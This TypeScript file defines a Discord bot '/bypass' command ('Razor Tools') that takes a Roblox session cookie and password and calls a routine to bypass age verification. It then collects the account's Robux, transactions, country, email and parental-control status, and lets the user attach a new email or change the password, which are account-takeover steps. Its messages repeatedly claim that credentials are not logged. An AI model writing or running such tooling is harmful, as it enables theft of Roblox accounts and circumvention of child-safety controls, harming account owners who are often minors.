import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  type ModalSubmitInteraction,
} from 'discord.js';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildAccountEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const data = new SlashCommandBuilder()
  .setName('bypass')
  .setDescription('Bypass Stuff')
  
  .addStringOption((opt) =>
    opt.setName('cookie').setDescription('Insert The Cookies!').setRequired(true)
  )
  .addStringOption((opt) =>
    opt.setName('password')
      .setDescription('Your Roblox password (we do NOT log or store this)')
      .setRequired(true)
  ) as SlashCommandBuilder;

const pendingModals = new Map<string, { action: 'email' | 'password'; cookie: string; password: string }>();

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const rawCookie = interaction.options.getString('cookie', true);
    const password = interaction.options.getString('password', true);

    const validation = await Roblox.validateCookie(rawCookie);
    if (!validation.valid) {
      const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const pwValid = await Roblox.validatePassword(validation.username!, password);
    if (!pwValid.valid) {
      const embed = buildErrorEmbed(
        `✧ **Invalid Password**\n────\n` +
        `⭑ The provided password is incorrect for this account.\n` +
        `⭑ Please try again.`
      );
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const email = await Roblox.fetchEmailInfo(rawCookie);
    if (!email.verified) {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Email Not Detected!')
        .setColor('#FFFFFF')
        .setDescription(
          `✧ **No verified email found**\n` +
          `────\n` +
          `⭑ ${validation.username} has no email on file.\n` +
          `⭑ You can add one or change the password.\n` +
          `⭑ Your credentials were not logged.`
        )
        .setImage('https://files.catbox.moe/955g15.gif')
        .setFooter({ text: 'Razor Tools On Top!', iconURL: 'https://files.catbox.moe/955g15.gif' });

      const id = Math.random().toString(36).slice(2, 10);
      pendingModals.set(id, { action: 'email', cookie: rawCookie, password });

      const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
        new ButtonBuilder()
          .setCustomId(`bypass_email_${id}`)
          .setLabel('📧 Change Email?')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`bypass_password_${id}`)
          .setLabel('🔑 Change Password?')
          .setStyle(ButtonStyle.Secondary)
      );

      await interaction.editReply({ embeds: [embed], components: [row] });
      return;
    }

    // Normal bypass flow (email exists)
    const progressEmbed = buildProgressEmbed('Sending bypass request...');
    await interaction.editReply({ embeds: [progressEmbed] });

    let lastMessage = 'Sending bypass request...';
    let timedOut = false;
    const result = await (async () => {
      let delay = 3000;
      const startTime = Date.now();
      const maxDuration = 60000;
      for (let attempt = 1; attempt <= 6; attempt++) {
        if (Date.now() - startTime > maxDuration) {
          timedOut = true;
          return { success: false, message: 'Timeout', timedOut: true };
        }
        const res = await Roblox.bypassAgeVerification(rawCookie, password);
        if (res.success) return res;
        if (res.inProgress) {
          lastMessage = `Processing... (attempt ${attempt}/6)`;
          const updateEmbed = buildProgressEmbed(lastMessage);
          await interaction.editReply({ embeds: [updateEmbed] });
          if (attempt < 6) {
            await new Promise(resolve => setTimeout(resolve, delay));
            delay = Math.min(delay * 1.5, 10000);
          }
          continue;
        }
        return res;
      }
      return { success: false, message: 'Still processing, please check later.', timedOut: true };
    })();

    if (timedOut) {
      const embed = buildProgressEmbed('Bypass timed out after 60 seconds. Please try again later.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    if (result.success) {
      const userId = validation.userId!;
      const age = await Roblox.getUserAge(userId);
      const robux = await Roblox.fetchRobux(rawCookie, String(userId));
      const summary = await Roblox.fetchTransactionTotals(rawCookie, String(userId));
      const country = await Roblox.fetchCountry(rawCookie);
      const parental = await Roblox.fetchParentalControls(rawCookie);
      const thumb = await Roblox.fetchAvatarThumbnail(String(userId));

      let newCookie = result.newCookie;
      let finalUserId = userId;
      let finalUsername = validation.username!;
      let finalDisplayName = validation.displayName || null;
      let finalAge = age;
      let finalRobux = robux;
      let finalSummary = summary;
      let finalCountry = country;
      let finalEmail = email;
      let finalParental = parental;
      let finalThumb = thumb;

      if (newCookie) {
        const newValidation = await Roblox.validateCookie(newCookie);
        if (newValidation.valid) {
          finalUserId = newValidation.userId!;
          finalUsername = newValidation.username!;
          finalDisplayName = newValidation.displayName || null;
          finalAge = await Roblox.getUserAge(finalUserId);
          finalRobux = await Roblox.fetchRobux(newCookie, String(finalUserId));
          finalSummary = await Roblox.fetchTransactionTotals(newCookie, String(finalUserId));
          finalCountry = await Roblox.fetchCountry(newCookie);
          finalEmail = await Roblox.fetchEmailInfo(newCookie);
          finalParental = await Roblox.fetchParentalControls(newCookie);
          finalThumb = await Roblox.fetchAvatarThumbnail(String(finalUserId));
        } else {
          newCookie = undefined;
        }
      }

      const embed = buildAccountEmbed(
        finalUsername,
        finalDisplayName,
        finalUserId,
        finalAge,
        finalRobux,
        finalSummary,
        finalCountry,
        finalEmail.verified ? `✅ Verified: \`${finalEmail.verified}\`` : 'No email found',
        finalParental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
        finalThumb
      );

      const id = newCookie ? Math.random().toString(36).slice(2, 10) : '';
      const row = newCookie ? buildCopyButtons(id, 'bypass', newCookie, false) : undefined;
      await interaction.editReply({ embeds: [embed], components: row ? [row] : [] });
    } else if (result.timedOut) {
      const embed = buildProgressEmbed('Bypass is still in progress. Please check later.');
      await interaction.editReply({ embeds: [embed] });
    } else {
      const embed = buildErrorEmbed(`✧ **Bypass Failed**\n────\n⭑ ${result.message}`);
      await interaction.editReply({ embeds: [embed] });
    }
  } catch (err: any) {
    logger.error({ err }, 'Bypass command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;

  const customId = interaction.customId;
  if (!customId.startsWith('bypass_email_') && !customId.startsWith('bypass_password_')) return;

  const parts = customId.split('_');
  const action = parts[1]; // 'email' or 'password'
  const id = parts[2];
  const session = pendingModals.get(id);
  if (!session) {
    await interaction.reply({ content: 'Session expired. Please run /bypass again.', flags: MessageFlags.Ephemeral });
    return;
  }

  const modal = new ModalBuilder()
    .setCustomId(`bypass_modal_${action}_${id}`)
    .setTitle(action === 'email' ? 'Add Pending Email' : 'Change Password');

  if (action === 'email') {
    const input = new TextInputBuilder()
      .setCustomId('new_email')
      .setLabel('New Email Address')
      .setStyle(TextInputStyle.Short)
      .setRequired(true)
      .setPlaceholder('Enter the new email');
    modal.addComponents(new ActionRowBuilder<TextInputBuilder>().addComponents(input));
  } else {
    const input = new TextInputBuilder()
      .setCustomId('new_password')
      .setLabel('New Password')
      .setStyle(TextInputStyle.Short)
      .setRequired(true)
      .setPlaceholder('Enter your new password');
    modal.addComponents(new ActionRowBuilder<TextInputBuilder>().addComponents(input));
  }

  await interaction.showModal(modal);
}

async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
  const parts = interaction.customId.split('_');
  const action = parts[2];
  const id = parts[3];
  const session = pendingModals.get(id);
  if (!session) {
    await interaction.reply({ content: 'Session expired. Please run /bypass again.', flags: MessageFlags.Ephemeral });
    return;
  }

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  const { cookie, password } = session;
  let result;

  if (action === 'email') {
    const newEmail = interaction.fields.getTextInputValue('new_email');
    result = await Roblox.addPendingEmail(cookie, newEmail, password);
    if (result.success) {
      const embed = buildSuccessEmbed(
        '✧ **Pending Email Added**\n' +
        `────\n` +
        `⭑ ${newEmail} has been added as a pending email.\n` +
        `⭑ Verification link sent to that address.\n` +
        `⭑ Your credentials were not logged.`
      );
      await interaction.editReply({ embeds: [embed] });
    } else {
      const embed = buildErrorEmbed(
        `✧ **Failed to Add Email**\n────\n⭑ ${result.error || 'Unknown error'}`
      );
      await interaction.editReply({ embeds: [embed] });
    }
  } else {
    const newPassword = interaction.fields.getTextInputValue('new_password');
    const twoFactor = await Roblox.checkTwoFactorStatus(cookie, '');
    if (twoFactor.enabled) {
      const embed = buildErrorEmbed(
        `✧ **2FA Detected**\n────\n` +
        `⭑ Authenticator is enabled on this account.\n` +
        `⭑ Password change is blocked for security.\n` +
        `⭑ Please disable 2FA first or use the official Roblox interface.`
      );
      await interaction.editReply({ embeds: [embed] });
      pendingModals.delete(id);
      return;
    }
    result = await Roblox.changePassword(cookie, password, newPassword);
    if (result.success) {
      const embed = buildSuccessEmbed(
        '✧ **Password Changed**\n' +
        `────\n` +
        `⭑ Your password has been updated successfully.\n` +
        `⭑ Your credentials were not logged.`
      );
      await interaction.editReply({ embeds: [embed] });
    } else {
      const embed = buildErrorEmbed(
        `✧ **Change Failed**\n────\n` +
        `⭑ ${result.error || 'Unknown error'}\n` +
        `⭑ Please check your current password and try again.`
      );
      await interaction.editReply({ embeds: [embed] });
    }
  }

  pendingModals.delete(id);
}

export const bypassCommand: Command = { data, execute, handleButton, handleModal };